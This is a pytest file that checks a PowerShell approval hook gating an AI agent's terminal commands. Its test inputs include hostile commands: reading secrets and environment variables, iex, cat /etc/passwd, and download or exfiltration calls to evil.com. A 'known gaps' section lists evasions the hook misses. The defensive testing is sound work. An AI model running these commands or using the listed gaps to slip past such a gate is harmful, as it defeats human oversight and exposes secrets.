"""
SAF-074 — Harden require-approval.ps1 fallback hook
Tests invoke the PowerShell script via subprocess on Windows.
BUG-176: Bash/PS1 fallback hooks share same vulnerabilities as Python gate.
"""
import json
import shutil
import subprocess
from pathlib import Path

import pytest

pytestmark = pytest.mark.skipif(
    shutil.which("powershell") is None and shutil.which("pwsh") is None,
    reason="PowerShell not available"
)

_SCRIPT = Path(__file__).resolve().parents[2] / "templates" / "agent-workbench" / ".github" / "hooks" / "scripts" / "require-approval.ps1"
_WS_ROOT = Path(__file__).resolve().parents[2]


def run_ps1_hook(tool_name: str, command_or_path: str, ws_root: Path) -> str:
    """Invoke require-approval.ps1 with the given tool input and return the decision."""
    if tool_name in ("run_in_terminal", "terminal", "run_command"):
        payload = json.dumps({"tool_name": tool_name, "tool_input": {"command": command_or_path}})
    else:
        payload = json.dumps({"tool_name": tool_name, "tool_input": {"filePath": command_or_path}})

    result = subprocess.run(
        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", str(_SCRIPT)],
        input=payload,
        capture_output=True,
        text=True,
        cwd=str(ws_root),
        timeout=15,
    )
    raw = result.stdout.strip()
    output = json.loads(raw)
    return output["hookSpecificOutput"]["permissionDecision"]


# ---------------------------------------------------------------------------
# Environment variable exfiltration — must all be DENY
# ---------------------------------------------------------------------------

def test_env_username_deny():
    """$env:USERNAME must be denied."""
    decision = run_ps1_hook("run_in_terminal", "Write-Output $env:USERNAME", _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


def test_env_secret_curly_deny():
    """${env:SECRET} must be denied."""
    decision = run_ps1_hook("run_in_terminal", "echo ${env:SECRET}", _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


def test_home_dollar_deny():
    """$HOME must be denied."""
    decision = run_ps1_hook("run_in_terminal", "echo $HOME", _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


def test_home_curly_deny():
    """${HOME} must be denied."""
    decision = run_ps1_hook("run_in_terminal", "echo ${HOME}", _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


# ---------------------------------------------------------------------------
# Dynamic execution / command substitution — must all be DENY
# ---------------------------------------------------------------------------

def test_invoke_expression_deny():
    """Invoke-Expression must be denied."""
    decision = run_ps1_hook("run_in_terminal", 'Invoke-Expression "Get-Content secret.txt"', _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


def test_iex_deny():
    """iex must be denied."""
    decision = run_ps1_hook("run_in_terminal", 'iex "malicious"', _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


def test_dollar_paren_substitution_deny():
    """$(whoami) dollar-paren substitution must be denied."""
    decision = run_ps1_hook("run_in_terminal", "echo $(whoami)", _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


# ---------------------------------------------------------------------------
# .NET type accelerators — must all be DENY
# ---------------------------------------------------------------------------

def test_io_file_short_deny():
    """[IO.File]::ReadAllText must be denied."""
    decision = run_ps1_hook("run_in_terminal", '[IO.File]::ReadAllText("secret.txt")', _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


def test_system_io_file_deny():
    """[System.IO.File]::ReadAllText must be denied."""
    decision = run_ps1_hook("run_in_terminal", '[System.IO.File]::ReadAllText("secret.txt")', _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


def test_add_type_deny():
    """Add-Type must be denied."""
    decision = run_ps1_hook("run_in_terminal", 'Add-Type -TypeDefinition "..."', _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


# ---------------------------------------------------------------------------
# Obfuscation patterns — must all be DENY
# ---------------------------------------------------------------------------

def test_base64_decode_long_deny():
    """base64 --decode must be denied."""
    decision = run_ps1_hook("run_in_terminal", "echo payload | base64 --decode", _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


def test_base64_d_short_deny():
    """base64 -d must be denied."""
    decision = run_ps1_hook("run_in_terminal", "echo payload | base64 -d", _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


# ---------------------------------------------------------------------------
# Sensitive system paths — must all be DENY
# ---------------------------------------------------------------------------

def test_etc_passwd_deny():
    """cat /etc/passwd must be denied."""
    decision = run_ps1_hook("run_in_terminal", "cat /etc/passwd", _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


def test_windows_users_deny():
    """type c:/users/angel/secret.txt must be denied."""
    decision = run_ps1_hook("run_in_terminal", r"type c:\users\angel\secret.txt", _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


# ---------------------------------------------------------------------------
# Safe commands — must be ASK (no false positives)
# ---------------------------------------------------------------------------

def test_safe_echo_ask():
    """echo hello world should be ASK (not denied)."""
    decision = run_ps1_hook("run_in_terminal", "echo hello world", _WS_ROOT)
    assert decision == "ask", f"Expected ask, got {decision!r}"


# ---------------------------------------------------------------------------
# Existing behavior preserved — .github reference must still DENY
# ---------------------------------------------------------------------------

def test_github_folder_deny():
    """.github reference must still be denied (existing behavior)."""
    decision = run_ps1_hook("run_in_terminal", "ls .github/hooks/", _WS_ROOT)
    assert decision == "deny", f"Expected deny, got {decision!r}"


# ===========================================================================
# Tester edge-case additions (SAF-074 review)
# ===========================================================================

# ---------------------------------------------------------------------------
# Case-folding: uppercase $ENV: must be denied
# ---------------------------------------------------------------------------

def test_env_uppercase_deny():
    """$ENV:USERNAME (uppercase ENV) must be denied via ToLowerInvariant case folding."""
    decision = run_ps1_hook("run_in_terminal", "Write-Output $ENV:USERNAME", _WS_ROOT)
    assert decision == "deny", f"Expected deny for uppercase $ENV:, got {decision!r}"


def test_env_curly_userprofile_deny():
    """${env:USERPROFILE} (curly brace + profile var) must be denied."""
    decision = run_ps1_hook("run_in_terminal", "echo ${env:USERPROFILE}", _WS_ROOT)
    assert decision == "deny", f"Expected deny for ${{env:USERPROFILE}}, got {decision!r}"


# ---------------------------------------------------------------------------
# Dynamic execution — additional aliases
# ---------------------------------------------------------------------------

def test_icm_alias_deny():
    """icm (Invoke-Command alias) must be denied — whole-word match required."""
    decision = run_ps1_hook("run_in_terminal", "icm hostname", _WS_ROOT)
    assert decision == "deny", f"Expected deny for icm, got {decision!r}"


def test_invoke_command_deny():
    """Invoke-Command -ScriptBlock must be denied."""
    decision = run_ps1_hook("run_in_terminal", "Invoke-Command -ScriptBlock { hostname }", _WS_ROOT)
    assert decision == "deny", f"Expected deny for Invoke-Command, got {decision!r}"


# ---------------------------------------------------------------------------
# .NET type accelerators — additional covered types
# ---------------------------------------------------------------------------

def test_streamreader_deny():
    """[System.IO.StreamReader]::new() must be denied — IO accelerator coverage."""
    decision = run_ps1_hook("run_in_terminal", '[System.IO.StreamReader]::new("secret.txt")', _WS_ROOT)
    assert decision == "deny", f"Expected deny for StreamReader, got {decision!r}"


def test_reflection_assembly_deny():
    """[System.Reflection.Assembly]::LoadFile() must be denied — reflection coverage."""
    decision = run_ps1_hook("run_in_terminal", '[System.Reflection.Assembly]::LoadFile("evil.dll")', _WS_ROOT)
    assert decision == "deny", f"Expected deny for Reflection.Assembly, got {decision!r}"


# ---------------------------------------------------------------------------
# No false positives on ordinary non-sensitive variables
# ---------------------------------------------------------------------------

def test_random_var_ask():
    """echo $RANDOM must NOT be denied — $RANDOM is not a sensitive variable."""
    decision = run_ps1_hook("run_in_terminal", "echo $RANDOM", _WS_ROOT)
    assert decision == "ask", f"Expected ask for $RANDOM (no false positive), got {decision!r}"


# ---------------------------------------------------------------------------
# Known gaps — documented and logged as bugs; current behavior asserted
# ---------------------------------------------------------------------------

def test_hex_escape_broken_ask():
    r"""echo '\x41\x42' returns ask — hex detection broken by backslash normalization.

    BUG-184: The \\x[0-9a-f]{2} regex runs AFTER the normalization step converts
    backslashes to forward-slashes, so \x41 becomes /x41 and the pattern never
    matches. Low severity: PowerShell does not natively use \x escapes.
    """
    decision = run_ps1_hook("run_in_terminal", r"echo '\x41\x42'", _WS_ROOT)
    # Current behavior: ask (broken detection). Ideal: deny.
    assert decision == "ask", f"Hex escape gap: expected ask (broken detection), got {decision!r}"


def test_splatting_gap_ask():
    """Variable splatting is not blocked by static pattern matching (BUG-185).

    $args=@('-Path','secret.txt');Get-Content @args returns ask — the hook
    cannot resolve variable values at evaluation time.
    """
    decision = run_ps1_hook("run_in_terminal", "$args2=@('-Path','secret.txt');Get-Content @args2", _WS_ROOT)
    assert decision == "ask", f"Splatting gap: expected ask, got {decision!r}"


def test_encoded_command_gap_ask():
    """powershell -EncodedCommand <b64> is not blocked (BUG-183).

    -EncodedCommand / -enc is a PowerShell-specific base64 obfuscation primitive.
    The current patterns block base64 --decode but not the -EncodedCommand flag.
    """
    decision = run_ps1_hook("run_in_terminal", "powershell -EncodedCommand dQBuAGEAdQB0AGgAbwByAGkAeQBlAGQA", _WS_ROOT)
    assert decision == "ask", f"EncodedCommand gap: expected ask, got {decision!r}"


def test_net_webclient_gap_ask():
    """[System.Net.WebClient]::new() is not blocked (BUG-182).

    .NET network type accelerators (Net.WebClient, Net.Http.HttpClient) can
    exfiltrate data. Current deny patterns cover only IO.* and Reflection.*.
    """
    decision = run_ps1_hook("run_in_terminal", "[System.Net.WebClient]::new().DownloadString('https://evil.com')", _WS_ROOT)
    assert decision == "ask", f"Net.WebClient gap: expected ask, got {decision!r}"


def test_invoke_webrequest_gap_ask():
    """Invoke-WebRequest to external URL is not blocked (BUG-182).

    Network exfiltration cmdlet. Returns ask so user approval is still required,
    but ideally should be auto-denied.
    """
    decision = run_ps1_hook("run_in_terminal", "Invoke-WebRequest https://evil.com/exfil", _WS_ROOT)
    assert decision == "ask", f"Invoke-WebRequest gap: expected ask, got {decision!r}"


def test_start_process_ask():
    """Start-Process returns ask (out of SAF-074 scope; user approval required)."""
    decision = run_ps1_hook("run_in_terminal", "Start-Process notepad.exe", _WS_ROOT)
    assert decision == "ask", f"Expected ask for Start-Process, got {decision!r}"
